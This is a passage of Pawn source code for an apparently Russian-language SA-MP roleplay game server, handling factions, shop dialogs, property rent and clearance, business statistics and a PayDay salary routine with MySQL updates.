        case 580: return (componentid == 1020 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007);
        case 585: return (componentid == 1044 || componentid == 1043 || componentid == 1174 || componentid == 1175 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1176 || componentid == 1177 || componentid == 1099 || componentid == 1042);
        case 587: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 589: return (componentid == 1005 || componentid == 1004 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1024 || componentid == 1013 || componentid == 1006 || componentid == 1016 || componentid == 1000 || componentid == 1017 || componentid == 1007);
        case 600: return (componentid == 1005 || componentid == 1004 || componentid == 1020 || componentid == 1022 || componentid == 1018 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1017 || componentid == 1007);
        case 602: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 603: return (componentid == 1144 || componentid == 1145 || componentid == 1142 || componentid == 1143 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007);
    }
    return 0;
}

stock GetGangName(fractionid)
{
	new string[20];
	switch(fractionid)
	{
		case 7: format(string, sizeof(string), "ОПГ \"Тамбовская\"");
		case 8: format(string, sizeof(string), "ОПГ \"Подольская\"");
		case 9: format(string, sizeof(string), "Рифа");
		case 10: format(string, sizeof(string), "Ацтек");
		case 11: format(string, sizeof(string), "Вагос");
	}
	return string;
}


stock IsPlayerToSquare(playerid,Float:min_x,Float:min_y,Float:max_x,Float:max_y)
{
	new Float:xxp,Float:yyp,Float:zzp;
	GetPlayerPos(playerid, xxp, yyp, zzp);
	if((xxp <= max_x && xxp >= min_x) && (yyp <= max_y && yyp >= min_y)) return 1;
	return 0;
}

stock LeaveFractionPlayer(playerid)
{
	if(PI[playerid][pMember] == TEAM_FBI) PI[playerid][P_LISTETING] = -1;

	printf("LEAVE %s[%d] member: %d rank: %d mskin: %d", GetName(playerid), PI[playerid][pMember], PI[playerid][pRank], PI[playerid][pMemberSkin]);

	PI[playerid][pMemberSkin] = PI[playerid][pMember] = PI[playerid][pRank] = 0;
	if(PI[playerid][pLeader]) PI[playerid][pLeader] = 0;
	PI[playerid][pFracWarn] = 0;
	ResetPlayerWeapons(playerid);
	SetPlayerSkin(playerid,PI[playerid][pModel]);
	SetPlayerColorEx(playerid,TeamColors[0]);
	MysqlUpdatePlayerInt(playerid, "memberskin", PI[playerid][pMemberSkin]);
	MysqlUpdatePlayerInt(playerid, "rank", PI[playerid][pRank]);
	MysqlUpdatePlayerInt(playerid, "member", PI[playerid][pMember]);
	MysqlUpdatePlayerInt(playerid, "leader", PI[playerid][pLeader]);
	MysqlUpdatePlayerInt(playerid, "fracwarn", PI[playerid][pFracWarn]);
	//PI[playerid][pSpawnChange] = 0;//Убрать
	return 1;
}

stock NewsPanel(playerid)
{
	new full = 0;
	full = (PI[playerid][pMember] == TEAM_SMI) ? (0) : (PI[playerid][pMember] == TEAM_SFNEWS) ? (1) : (2);
	new string[210];
	format(string, sizeof(string), "%s\n{FFFFFF}- Пригласить в эфир\n{FFFFFF}- Выпроводить из эфира\n%s\n%s\n{FFFF00}- Объявления [Новых %i]",
	!Ether[playerid] ? ("{63BD4E}- Войти в эфир") : ("{F04245}- Выйти из эфира"),
	!EtherCall[full] ? ("{63BD4E}- Включить прием звонков в эфир") : ("{F04245}- Выключить прием звонков в эфир"),
	!EtherSms[full] ? ("{63BD4E}- Включить прием смс в эфир") : ("{F04245}- Выключить прием смс в эфир"),
	TOTALADVERT[full]);
	ShowPlayerDialog(playerid, D_NMENU, 2,
	(PI[playerid][pMember] == TEAM_SMI) ? ("{FFCD00}СМИ {FFFFFF}(т. 555)") :
	(PI[playerid][pMember] == TEAM_SFNEWS) ? ("{FFCD00}Закрыто {FFFFFF}(т. 666)") : ("{FFCD00}Закрыто {FFFFFF}(т. 777)"),
	string, "Принять", "Отмена");
	return 1;
}

stock MobileCrash(playerid)
{
	SendClientMessage(Mobile[playerid], COLOR_GRAD2, "Абонент положил трубку");
	SetPlayerSpecialAction(Mobile[playerid], SPECIAL_ACTION_STOPUSECELLPHONE);
	CellTime[Mobile[playerid]] = CellTime[playerid] = Mobile[Mobile[playerid]] = -1;
	if(EtherCalled[playerid] == true) EtherCalled[playerid] = false;
	if(EtherCalled[Mobile[playerid]] == true) EtherCalled[Mobile[playerid]] = false;
	Mobile[playerid] = -1;
	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
	DeletePVar(playerid, "CallTime");
	DeletePVar(Mobile[playerid], "CallTime");
	return 1;
}

stock ClearBizz(i)
{
	new playerid = GetPlayerID(BizzInfo[i][bOwner]);
	if(playerid != INVALID_PLAYER_ID)
	{
		if(IsPlayerConnected(playerid) && PlayerLogged[playerid])
		{
			PI[playerid][pBank] += BizzInfo[i][bBuyPrice];
			PI[playerid][pBank] += BizzInfo[i][bMoney];
			SendClientMessage(playerid, COLOR_YELLOW,"[Налоговая служба] Ваш бизнес закрыли в связи с нехваткой ресурсов");
			SendClientMessage(playerid, COLOR_YELLOW,"[Налоговая служба] Половина стоимости бизнеса и его бюджет зачислены на Ваш банковский счет");
			MysqlUpdatePlayerInt(playerid, "bank", PI[playerid][pBank]);
		}
	}
	else
	{
		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "SELECT `bank`,`text` FROM "T_ACCOUNTS" WHERE name = '%s'", BizzInfo[i][bOwner]);
		mysql_tquery(dbHandle, STRING_GLOBAL, "OfflineClearBizz", "i", i);
	}
	BizzPay[i] = BizzInfo[i][bLock] = BizzInfo[i][bLockTime] = BizzInfo[i][bControl] = BizzInfo[i][bBuyPrice] = BizzInfo[i][bMoney] = BizzInfo[i][bEnter] = 0;
	BizzInfo[i][bTill] = 50;
	switch(BizzInfo[i][bType])
	{
	    case 1: BizzInfo[i][bProduct] = 5000;
	    case 2: BizzInfo[i][bProduct] = 20000;
	    case 3: BizzInfo[i][bProduct] = 3000;
	    case 4: BizzInfo[i][bProduct] = 7000;
	    case 5: BizzInfo[i][bProduct] = 7000;
	    case 6: BizzInfo[i][bProduct] = 20000;
	    case 7: BizzInfo[i][bProduct] = 100000;
	    case 8: BizzInfo[i][bProduct] = 50000;
	    case 9: BizzInfo[i][bProduct] = 50000;
	}
	strmid(BizzInfo[i][bOwner], "None", 0, strlen("None"), MAX_PLAYER_NAME);
	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_BIZZ" SET owner='%s', block=%d, locktime=%d, money=%d, penter=%d, till=%d,buyprice=%d,product=%d,mafia=%d WHERE id = %d",
	BizzInfo[i][bOwner], BizzInfo[i][bLock], BizzInfo[i][bLockTime], BizzInfo[i][bMoney], BizzInfo[i][bEnter], BizzInfo[i][bTill],BizzInfo[i][bBuyPrice],BizzInfo[i][bProduct],BizzInfo[i][bControl],i);
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
	UpdateBizz(i);
	return 1;
}

forward OfflineClearBizz(bizzid);
public OfflineClearBizz(bizzid)
{
    new rows, fields, bank, texts[20], text[4];
	cache_get_data(rows, fields);
	if(rows)
	{
		bank = cache_get_row_int(0, 0, dbHandle); // bank
		cache_get_row(0, 1, texts, dbHandle); // text
	}
	sscanf(texts, "p<,>a<i>[4]", text);
	format(texts, sizeof(texts), "%i, 1, %i, %i", text[0], text[2], text[3]);
	bank += BizzInfo[bizzid][bBuyPrice];
	bank += BizzInfo[bizzid][bMoney];

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_ACCOUNTS" SET text = '%s', bank = %i WHERE name = '%s'", texts, bank, BizzInfo[bizzid][bOwner]);
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
	return 1;
}

stock GetHomeOplata(idx)
{
	new htax;
	switch(HouseInfo[idx][hDiscript])
	{
		case 1: htax = 750;
		case 2: htax = 1300;
		case 3: htax = 1850;
		case 4: htax = 2500;
	}
	return htax;
}

stock GetBizOplata(idx)
{
	new btax;
	switch(BizzInfo[idx][bType])
	{
		case 1: btax = 2000;
		case 2: btax = 2000;
		case 3: btax = 2000;
		case 4: btax = 2000;
		case 5: btax = 2000;
		case 6: btax = 2000;
		case 7: btax = 2000;
		case 8: btax = 2000;
		case 9: btax = 2000;
		case 10: btax = 2000;
	}
	return btax;
}

forward OfflineClearHouse(houseid);
public OfflineClearHouse(houseid)
{
    new rows, fields, texts[16], text[4];
	cache_get_data(rows, fields);
	if(rows) cache_get_field_content(0, "text", texts);
	sscanf(texts, "p<,>a<i>[4]", text);
	format(texts, sizeof(texts), "%i, %i, %i, %i", houseid, text[1], text[2], text[3]);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_ACCOUNTS"  SET text = '%s' WHERE name = '%s'", texts, HouseInfo[houseid][hOwner]);
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
	return 1;
}

/*forward OfflineClearKvar(kvarid);
public OfflineClearKvar(kvarid)
{
    new rows, fields, texts[16], text[4];
	cache_get_data(rows, fields);
	if(rows) cache_get_field_content(0, "text", texts);
	sscanf(texts, "p<,>a<i>[4]", text);
	format(texts, sizeof(texts), "%i, %i, %i, %i", kvarid, text[1], text[2], text[3]);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_ACCOUNTS"  SET text = '%s' WHERE name = '%s'", texts, RoomsInfo[kvarid][rOwner]);
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
	return 1;
}*/

stock GunShopList(playerid)
{
	if(g_player_skills[playerid][S_LICS][3] == 0) return SendClientMessage(playerid, COLOR_GREY, "У Вас нет лицензии на оружие!");
	new string[700], str[80];
	//strcat(string, "{FFFF00}Наименование\t\t{FFFF00}Цена\n");
	for(new i; i < GUN_OBJECTS-8; i++)
	{
	    format(str, sizeof(str), "{FFFFFF}%s\t\t{63BD4E}%dр\n", gGunNames[i], gGunCosts[i]);
	    strcat(string, str);
	}
	for(new i = 2; i < GUN_OBJECTS; i++)
	{
	    format(str, sizeof(str), "{FFFFFF}%s\t\t{63BD4E}%dр\n", gGunNames[i], gGunCosts[i]);
	    strcat(string, str);
	}
	ShowPlayerDialog(playerid, 1374, DIALOG_STYLE_LIST, "Магазин оружия", string, "Купить", "Отмена");
	return 1;
}

stock SkinShopList(playerid)
{
	if(PI[playerid][pMember] != 0)
		return SendClientMessage(playerid, C_RED, "Вы состоите в организации");

	ShowPlayerDialog(playerid, D_JOB+31, DIALOG_STYLE_MSGBOX, "Покупка одежды", "{FFFFFF}Вы хотите перейти к выбору одежды?", "Да", "Нет");
	return 1;
}

stock MagazineList(playerid)
{
	ShowPlayerDialog
	(
		playerid, D_HEAL+13, DIALOG_STYLE_TABLIST_HEADERS,
		"{ffd83d}Витрина магазина 24/7",
		"Название\tЦена\n"\
		"{ffffff}Фотоаппарат\t{37c268}1000 рублей\n"\
		"{ffffff}Телефон\t{37c268}30000 рублей\n"\
		"{ffffff}Сим-карта\t{37c268}4000 рублей\n"\
		"{ffffff}Цветы\t{37c268}550 рублей\n"\
		"{ffffff}Маска\t{37c268}3500 рублей\n"\
		"{ffffff}Сигареты\t{37c268}250 рублей\n"\
		"{ffffff}Аптечка\t{37c268}2500 рублей\n"\
		"{ffffff}Кабель\t{37c268}15000 рублей\n",
		"Купить", "Отмена"
	);

	return 1;
}
stock EatList(playerid, idx)
{
	new str[64];

	STRING_GLOBAL = "Название\tЦена\n";

	for(new i; i < EAT_OBJECTS; i++)
	{
	    if(GetPlayerInterior(playerid) == 5)
	    {
			format(str, sizeof str, "{FFFFFF}%s\t\t{63BD4E}%dр\n", gEateryNames1[i], gEateryCosts[i]);
			strcat(STRING_GLOBAL, str);
		}
	    else if(GetPlayerInterior(playerid) == 10)
	    {
			format(str, sizeof str, "{FFFFFF}%s\t\t{63BD4E}%dр\n", gEateryNames2[i], BizzInfo[idx][bTill] * gEateryCosts[i]);
			strcat(STRING_GLOBAL, str);
		}
	    else if(GetPlayerInterior(playerid) == 9)
	    {
			format(str, sizeof str, "{FFFFFF}%s\t\t{63BD4E}%dр\n", gEateryNames3[i], BizzInfo[idx][bTill] * gEateryCosts[i]);
			strcat(STRING_GLOBAL, str);
		}
	}
	ShowPlayerDialog(playerid, D_HEAL+14, DIALOG_STYLE_TABLIST_HEADERS, "Закусочная", STRING_GLOBAL, "Купить", "Отмена");
	return 1;
}

stock BarList(playerid)
{
	ShowPlayerDialog(playerid, D_HEAL+15, DIALOG_STYLE_LIST, "Барная стойка","\
	\nВода (50р)\
	\nСода (100р)\
	\nКока-кола (150р)\
	\nПиво (200р)\
	\nВодка (250р)\
	\nКоньяк (300р)\
	\nАбсент (350р)", "Купить", "Отмена");
	return 1;
}

stock IsAIP(text[])
{
	new numbers;
	for(new i = 0; i < strlen(text); i++) if('0' <= text[i] <= '9') if(!('0' <= text[i+1] <= '9')) numbers ++;
	if(numbers >= 4) return 1;
	return 0;
}

stock BizzStats(playerid, idx)
{
	if(BizzInfo[idx][bProduct] < 1) SendClientMessage(playerid, COLOR_YELLOW, "Бизнес не приносит прибыли по причине отсутствия продуктов");
	new text1[30];
	new stringase[500];
	if(BizzInfo[idx][bLock] == 0) text1 = "{34c924}Бизнес открыт";
	if(BizzInfo[idx][bLock] == 1) text1 = "{ff2900}Бизнес закрыт";
	new srcc[64];
	if(BizzInfo[idx][bType] != 2)
	{
 		format(stringase,sizeof(stringase),"{FFFFFF}Название:\t\t\t\t{FFCC00}%s\n",BizzInfo[idx][bName]);
		format(srcc,sizeof(srcc),"{FFFFFF}Номер заправки:\t\t\t{FFCC00}%d\n",BizzInfo[idx][bID]);
		strcat(stringase,srcc,sizeof(stringase));
		format(srcc,sizeof(srcc),"{FFFFFF}Стоимость:\t\t\t\t{FFCC00}%dР\n",BizzInfo[idx][bPrice]);
		strcat(stringase,srcc,sizeof(stringase));
		format(srcc,sizeof(srcc),"{FFFFFF}Аренда территории:\t\t\t{FFCC00}%iР в день\n\n",BizzInfo[idx][bOplata]);
		strcat(stringase,srcc,sizeof(stringase));
		format(srcc,sizeof(srcc),"{FFFFFF}АЗС арендована на:\t\t\t{FFCC00}%d/30 дней\n",BizzInfo[idx][bOplata]);
		strcat(stringase,srcc,sizeof(stringase));
		format(srcc,sizeof(srcc),"{FFFFFF}Количество топлива:\t\t\t{FFCC00}%d из 5000\n",BizzInfo[idx][bProduct]);
		strcat(stringase,srcc,sizeof(stringase));
		format(srcc,sizeof(srcc),"{FFFFFF}Бюджет заправки:\t\t\t{FFCC00}%dР\n\n",BizzInfo[idx][bMoney]);
		strcat(stringase,srcc,sizeof(stringase));
		format(srcc,sizeof(srcc),"{FFFFFF}Цена топлива:\t\t\t{FFCC00}%dР за 1 литр\n",BizzInfo[idx][bTill]);
		strcat(stringase,srcc,sizeof(stringase));
		format(srcc,sizeof(srcc),"{FFFFFF}Статус:\t\t\t\t\t{FFCC00}%s\n\n",text1);
		strcat(stringase,srcc,sizeof(stringase));
		SPD(playerid, D_NULL, 0, "{ffcf00}Информация о бизнесе", stringase, "закрыть", "");
	}
	else
	{
		format(stringase,sizeof(stringase),"{FFFFFF}Название:\t\t\t\t{FFCC00}%s\n",BizzInfo[idx][bName]);
		format(srcc,sizeof(srcc),"{FFFFFF}Номер бизнеса:\t\t\t{FFCC00}%d\n",BizzInfo[idx][bID]);
		strcat(stringase,srcc,sizeof(stringase));
		format(srcc,sizeof(srcc),"{FFFFFF}Стоимость:\t\t\t\t{FFCC00}%dР\n",BizzInfo[idx][bPrice]);
		strcat(stringase,srcc,sizeof(stringase));
		format(srcc,sizeof(srcc),"{FFFFFF}Арендная плата:\t\t\t{FFCC00}%iР в день\n\n",BizzInfo[idx][bOplata]);
		strcat(stringase,srcc,sizeof(stringase));
		format(srcc,sizeof(srcc),"{FFFFFF}Бизнес арендован на:\t\t{FFCC00}%d/30 дней\n",BizzInfo[idx][bOplata]);
		strcat(stringase,srcc,sizeof(stringase));
		format(srcc,sizeof(srcc),"{FFFFFF}Количество продуктов:\t\t{FFCC00}%d из 5000\n",BizzInfo[idx][bProduct]);
		strcat(stringase,srcc,sizeof(stringase));
		format(srcc,sizeof(srcc),"{FFFFFF}Баланс предприятия:\t\t\t{FFCC00}%dР\n\n",BizzInfo[idx][bMoney]);
		strcat(stringase,srcc,sizeof(stringase));
		format(srcc,sizeof(srcc),"{FFFFFF}Плата за вход:\t\t\t\t{FFCC00}%d$\n",BizzInfo[idx][bEnter]);
		strcat(stringase,srcc,sizeof(stringase));
		format(srcc,sizeof(srcc),"{FFFFFF}Статус:\t\t\t\t\t{FFCC00}%s\n\n",text1);
		strcat(stringase,srcc,sizeof(stringase));
		SPD(playerid, D_NULL, 0, "{ffcf00}Информация о бизнесе", stringase, "закрыть", "");
	}
	return 1;
}

stock AdvertList(playerid)
{
	new full = 0;
	full = (PI[playerid][pMember] == TEAM_SMI) ? (0) : (1);
	new str[42], str2[630];
	for(new i = 1; i <= TOTALADVERT[full]; i++)
	{
		format(str, sizeof(str), "№%i - Прислал: %s\n",i, AdvertInfo[i][full][aName]);
		strcat(str2, str);
	}
	if(TOTALADVERT[full] == 0) return ShowPlayerDialog(playerid, D_NULL, 0, "Объявления", "{FFFFFF}Новых объявлений нет", "Назад", "");
	ShowPlayerDialog(playerid, D_NMENU+5, 2, "Объявления", str2, "Принять", "Отмена");
	return 1;
}

stock BankFracEnter(playerid)
{
	new bank, string[256];
	if(PI[playerid][pMember] == TEAM_SMI) bank = FracBank[8];
	if(PI[playerid][pMember] == TEAM_SFNEWS) bank = FracBank[9];
	if(PI[playerid][pMember] == TEAM_LVNEWS) bank = FracBank[10];
	format(string, sizeof(string), "Ввод средств в банк организации\nВывод средств из банка организации\nВ банке организации: %iр", bank);
	ShowPlayerDialog(playerid, D_JOB+131, 2, "Банк", string, "Принять", "Отмена");
	return 1;
}

stock SetPosInShop(playerid)
{
	SetPlayerPos(playerid,1105.7463, 1542.9768, 2316.1677);
	SetPlayerFacingAngle(playerid,101.9068);
	SetPlayerInterior(playerid,3);
	SetPlayerVirtualWorld(playerid,playerid);
	TogglePlayerControllable(playerid,false);
	pPressed[playerid] = 0;
	LinkVehicleToInterior(PI[playerid][SalonCarID],3);
	SetVehicleVirtualWorld(PI[playerid][SalonCarID],playerid);
	PutPlayerInVehicle(playerid,PI[playerid][SalonCarID],0);
}

forward OfflineSetReferalMoney(playerid);
public OfflineSetReferalMoney(playerid)
{
    new rows, fields, texts[12], text[4];
	cache_get_data(rows, fields);
	if(rows) cache_get_field_content(0, "text", texts);
    sscanf(texts, "p<,>a<i>[4]", text);
   	format(texts, sizeof(texts), "%i, %i, %i, %i", text[0], text[1], 1, text[3]);

	STRING_GLOBAL[0] = EOS;
    format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_ACCOUNTS"  SET text = '%s' WHERE name = '%s'", texts, PI[playerid][pReferal]);
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
	return 1;
}

stock PayDay()
{
    new string[128];
    foreach(new i: Player)
	{
	    if(PlayerLogged[i])
	    {
			if(PI[i][pCheckTime] >= 1200 && IsThePayDayMembers(PI[i][pMember]) && !PI[i][pAdmin])
			{
				PI[i][pPayCheck] += Fraction_Pay[GetTeamID(i)][PI[i][pRank]-1];
			}
			SendClientMessage(i, COLOR_WHITE, "");
			SendClientMessage(i, COLOR_WHITE, "______________________________________");
			if(PI[i][pMember])
			{
				format(string, sizeof(string), "- Зарплата: {66CC00}%dр", Fraction_Pay[GetTeamID(i)][PI[i][pRank]-1]);
				SendClientMessage(i, COLOR_WHITE, string);
				GiveBankMoney(i, Fraction_Pay[GetTeamID(i)][PI[i][pRank]-1], "PayDay");
				FracBank[9] -= Fraction_Pay[GetTeamID(i)][PI[i][pRank]-1];
				MysqlUpdateOtherInt("sfnbank", FracBank[9]);
			}
			if(MP1[0] > 0)
			{
			    format(string, sizeof(string), "- Гос. Налог: {0099FF}%dр", MP1[0]);
			    SendClientMessage(i, COLOR_WHITE, string);
			    PI[i][pBank] -= MP1[0];
				FracBank[9] += MP1[0];
				MysqlUpdateOtherInt("sfnbank", FracBank[9]);
				MysqlUpdatePlayerInt(i, "bank", PI[i][pBank]);
			}
			format(string, sizeof(string), "- Доп. зарплата: {0099FF}%dр", PI[i][pPayCheck]);
			SendClientMessage(i, COLOR_WHITE, string);
			FracBank[9] -= PI[i][pPayCheck];
			MysqlUpdateOtherInt("sfnbank", FracBank[9]);
			GiveBankMoney(i, PI[i][pPayCheck], "PayDay");
			format(string, sizeof(string), "- Текущий баланс счёта: {0099FF}%dр", PI[i][pBank]);
			SendClientMessage(i, COLOR_WHITE, string);
			PI[i][pPayCheck] = 0;
			PI[i][pZakon]++;
			MysqlUpdatePlayerInt(i, "paycheck", PI[i][pPayCheck]);
			MysqlUpdatePlayerInt(i, "zakon", PI[i][pZakon]);

			new fmt_query[50+MAX_PLAYER_NAME];

			format(fmt_query, sizeof fmt_query, "UPDATE `accounts` SET `phone`='%d, %d' WHERE `name`='%s'", PI[i][pPhone][0], PI[i][pPhone][1], GetName(i));
			mysql_query(dbHandle, fmt_query);

			if(PI[i][pCheckTime] < 0) SendClientMessage(i, COLOR_DARKORANGE, "В этом часу Вы отыграли менее 20 минут, по этому ничего не получаете!");//убрать
			else
			{
				PI[i][pTime]++;
				MysqlUpdatePlayerInt(i, "time", PI[i][pTime]);
				if(!doubling_donate){ PI[i][pExp]++;}
				else { PI[i][pExp]+=2; }
			    if(PI[i][pVip] && !(PI[i][pTime] % 2)) PI[i][pExp]++;
			    format(string, sizeof(string), "- Опыт (%d из %d)", PI[i][pExp], (PI[i][pLevel]+1)*2);
			    SendClientMessage(i, COLOR_WHITE, string);
				MysqlUpdatePlayerInt(i, "exp", PI[i][pExp]);
			    if(PI[i][pExp] >= (PI[i][pLevel]+1)*2)
			    {
			        SendClientMessage(i, TEAM_BLUE_COLOR, "Ваш игровой возраст повысился!");
				    PI[i][pLevel]++;
				    PI[i][pAge]++;
				    PI[i][pExp] = 0;
				    SetPlayerScore(i, PI[i][pLevel]);
					MysqlUpdatePlayerInt(i, "level", PI[i][pLevel]);
					MysqlUpdatePlayerInt(i, "age", PI[i][pAge]);
					MysqlUpdatePlayerInt(i, "exp", PI[i][pExp]);
			    }
			    if(PI[i][pLevel] == 4 && PI[i][pExp] == 0)
			    {
			        if(!strcmp(PI[i][pReferal], "None", true)) { }
			        else
			        {
			        	new targetid = GetPlayerID(PI[i][pReferal]);
						if(targetid != INVALID_PLAYER_ID)
						{
							GiveMoney(targetid, 40000);
						    SendClientMessage(targetid, COLOR_YELLOW, "Вы получили {ffffff}40000 рублей{FFCC00} за приглашенного игрока");
						}
						else
						{
						  	format(string, sizeof(string), "SELECT * FROM `accounts` WHERE name = '%s'", PI[i][pReferal]);
						  	mysql_tquery(dbHandle, string, "OfflineSetReferalMoney", "i", i);
						}
			   		}
			    }
			}
			PI[i][pCheckTime] = 0;
			MysqlUpdatePlayerInt(i, "checktime", PI[i][pCheckTime]);
			Conday[1] = 0;
			SendClientMessage(i, COLOR_WHITE, "______________________________________");
			PlayerPlaySound(i,5203,0.0,0.0,0.0);
		}
		else SendClientMessage(i, COLOR_DARKORANGE, "Вы не авторизированы для получения зарплаты");
	}
	new hour;
	gettime(hour, _, _);
	if(hour == 3)
	{
		for(new houseid = TOTALHOUSE; houseid > 0; houseid --)
		{
			if(!strcmp("None", HouseInfo[houseid][hOwner], true)) continue;
			if(HouseInfo[houseid][hOplata] < 1)
			{
				new targetid = GetPlayerID(HouseInfo[houseid][hOwner]);
				if(targetid != INVALID_PLAYER_ID)
				{
					PI[targetid][pBank] += HouseInfo[houseid][hBuyPrice];
					PI[targetid][pSpawnChange] = 0;
					MysqlUpdatePlayerInt(targetid, "spawnchange", PI[targetid][pSpawnChange]);
					SendClientMessage(targetid, COLOR_YELLOW, "Ваш дом был продан за неуплату");
					SendClientMessage(targetid, COLOR_YELLOW, "На Ваш банковский счет возвращена стоимость дома по гос-ву");
					MysqlUpdatePlayerInt(targetid, "bank", PI[targetid][pBank]);
				}
				else
				{
					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "SELECT * FROM "T_ACCOUNTS" WHERE name = '%s'", HouseInfo[houseid][hOwner]);
					mysql_tquery(dbHandle, STRING_GLOBAL, "OfflineClearHouse", "i", houseid);
				}
				strmid(HouseInfo[houseid][hOwner], "None", 0, strlen("None"), MAX_PLAYER_NAME);
				HouseInfo[houseid][hBuyPrice] = HouseInfo[houseid][hOplata] = HouseInfo[houseid][hGarage] = HouseInfo[houseid][hAutoDoors] = 0;
				HouseInfo[houseid][hLock] = 1;

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_HOUSE" SET hOwner='%s',hOplata=%d,buyprice=%d,hGarage=%d,hAutoDoors=%d,hLock=%d WHERE id=%d",
				HouseInfo[houseid][hOwner],HouseInfo[houseid][hOplata],HouseInfo[houseid][hBuyPrice],HouseInfo[houseid][hGarage],HouseInfo[houseid][hAutoDoors],HouseInfo[houseid][hLock],houseid);
				mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
				UpdateHouse(houseid);
			}
			else
			{
				HouseInfo[houseid][hOplata] -= 1;
				MysqlUpdateHouseInt(houseid, "hOplata", HouseInfo[houseid][hOplata]);
			}
		}
		for(new businessid = TOTALBIZZ; businessid > 0; businessid --)
		{
			if(!strcmp("None", BizzInfo[businessid][bOwner], true)) continue;
			if(BizzInfo[businessid][bOplata] < 1)
			{
				new targetid = GetPlayerID(BizzInfo[businessid][bOwner]);
				if(targetid != INVALID_PLAYER_ID)
				{
					PI[targetid][pBank] += BizzInfo[businessid][bBuyPrice];
					SendClientMessage(targetid, COLOR_YELLOW, "Ваш бизнес был продан за неуплату");
					SendClientMessage(targetid, COLOR_YELLOW, "На Ваш банковский счет возвращена стоимость бизнеса по гос-ву");
					MysqlUpdatePlayerInt(targetid, "bank", PI[targetid][pBank]);
				}

				ClearBizz(businessid);
			}
			else
			{
				BizzInfo[businessid][bOplata] -= 1;
				MysqlUpdateBizzInt(businessid, "oplata", BizzInfo[businessid][bOplata]);
			}
		}
		for(new entranceid = TOTALENTRANCE; entranceid > 0; entranceid --)
		{
			for(new roomid = 22; roomid > 0; roomid --)
			{
				if(!strcmp("None", g_rooms[entranceid][roomid][ER_OWNER], true)) continue;

				if(GetRoomData(entranceid, roomid, ER_PAY) < 1)
				{
					new targetid = GetPlayerID(g_rooms[entranceid][roomid][ER_OWNER]);
					if(targetid != INVALID_PLAYER_ID)
					{
						SendClientMessage(targetid, COLOR_YELLOW, "Ваша квартира была продана за неуплату");

						PI[targetid][P_ENTRANCE] =
						PI[targetid][P_ROOM] = -1;

						MysqlUpdatePlayerInt(targetid, "entrance", PI[targetid][P_ENTRANCE]);
						MysqlUpdatePlayerInt(targetid, "room", PI[targetid][P_ROOM]);
					}

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE accounts SET entrance=-1, room=-1 WHERE name='%s'", g_rooms[entranceid][roomid][ER_OWNER]);
					mysql_query(dbHandle, STRING_GLOBAL);

					g_rooms[entranceid][roomid][ER_PAY] = 1;

					g_rooms[entranceid][roomid][ER_OWNER] = EOS;
					strcat(g_rooms[entranceid][roomid][ER_OWNER], "None");
				}
				else
				{
					g_rooms[entranceid][roomid][ER_PAY] --;
				}

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE rooms SET owner='%s', pay=%d WHERE id=%d", g_rooms[entranceid][roomid][ER_OWNER], g_rooms[entranceid][roomid][ER_PAY], g_rooms[entranceid][roomid][ER_SQL_ID]);
				mysql_query(dbHandle, STRING_GLOBAL);
			}
		}
	}
	for(new bizzid = TOTALBIZZ; bizzid > 0; bizzid --)
	{
		switch(BizzInfo[bizzid][bControl])
    	{
    		case TEAM_OPG1:
			{
				FracBank[6] += BizzPay[bizzid] / 10;
				MysqlUpdateMafiaInt("lcnbank", FracBank[6]);
			}
	    	case TEAM_RSM:
			{
				FracBank[5] += BizzPay[bizzid] / 10;
				MysqlUpdateMafiaInt("yakuzabank", FracBank[5]);
			}
		}

	    if(!strcmp(BizzInfo[bizzid][bOwner], "None", true)) continue;
	    if(BizzInfo[bizzid][bLock] == 1 && BizzInfo[bizzid][bLockTime] >= 36) ClearBizz(bizzid);
	    else
	    {
	       	BizzPay[bizzid] = 0;
	       	new playerid = GetPlayerID(BizzInfo[bizzid][bOwner]);
			if(playerid != INVALID_PLAYER_ID && IsPlayerConnected(playerid))
			{
				BizzInfo[bizzid][bLock] = 1;
				MysqlUpdateBizzInt(bizzid, "block", BizzInfo[bizzid][bLock]);
			}
			if(BizzInfo[bizzid][bLock] == 1)
			{
				BizzInfo[bizzid][bLockTime]++;
				MysqlUpdateBizzInt(bizzid, "locktime", BizzInfo[bizzid][bLockTime]);
			}
			if(BizzInfo[bizzid][bLockTime] > 1 && BizzInfo[bizzid][bLockTime] < 36)
			{
				if(IsPlayerConnected(playerid) && playerid != INVALID_PLAYER_ID)
				{
					if(GetPlayerBizz(playerid))
					{
